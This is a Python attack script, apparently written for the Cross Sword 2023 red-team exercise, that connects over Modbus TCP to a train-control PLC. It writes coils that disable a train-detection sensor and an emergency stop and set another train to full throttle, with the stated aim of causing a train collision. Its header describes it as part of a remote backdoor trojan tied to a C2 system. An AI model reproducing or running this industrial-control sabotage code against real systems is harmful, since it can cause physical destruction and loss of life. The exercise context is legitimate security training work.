#-----------------------------------------------------------------------------
# Name:        FalseCmdInjector.py
#
# Purpose:     A false command injection attack program to send the false train
#              detection sensor power off to cause the train collision.
#
# Author:      Yuancheng Liu
#
# Created:     2023/10/02
# Version:     v_0.1
# Copyright:   
# License:     
#-----------------------------------------------------------------------------

""" Program design: 
    We want to implement a remote backdoor trojan which can carry other Malicious
    Action function to build a remote controlable malware which can linked in our 
    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
    This program will be used in the testRun attack demo and verfication of the 
    cyber event : Cross Sword 2023
"""
import os
import time
import subprocess
from datetime import datetime
import c2MwUtils
import c2Client
import modbusTcpCom

# Train control PLC-03 ip address
hostIp = '10.107.105.7'
hostPort = 502

client = modbusTcpCom.modbusTcpClient(hostIp)
print('Try to connect to the target victim PLC: %s' %str(hostIp))

# Try to reconnect if failed.
while not client.checkConn():
    print('try connect to the PLC')
    print(client.getCoilsBits(0, 4))
    time.sleep(0.5)

print('Target PLC accept connection request.')
time.sleep(1)
print('Inject front train detection sensor holding register safe [hr10 val=0]  for  train-we0...')
client.setCoilsBit(10, False)
time.sleep(1)
print("Inject train train-we1 emmergency stop [coil val=0] .")
client.setCoilsBit(1, False)
print("Inject train train-we0 power full trottle [coil val=1] ...")
client.setCoilsBit(0, True)
while True:
    print('Inject front train detection sensor holding register safe [hr10 val=0]  for  train-we0...')
    time.sleep(1)
    print("Inject train train-we1 emmergency stop [coil val=0] .")
    time.sleep(1)
    print("Inject train train-we0 power full trottle [coil val=1] ...")
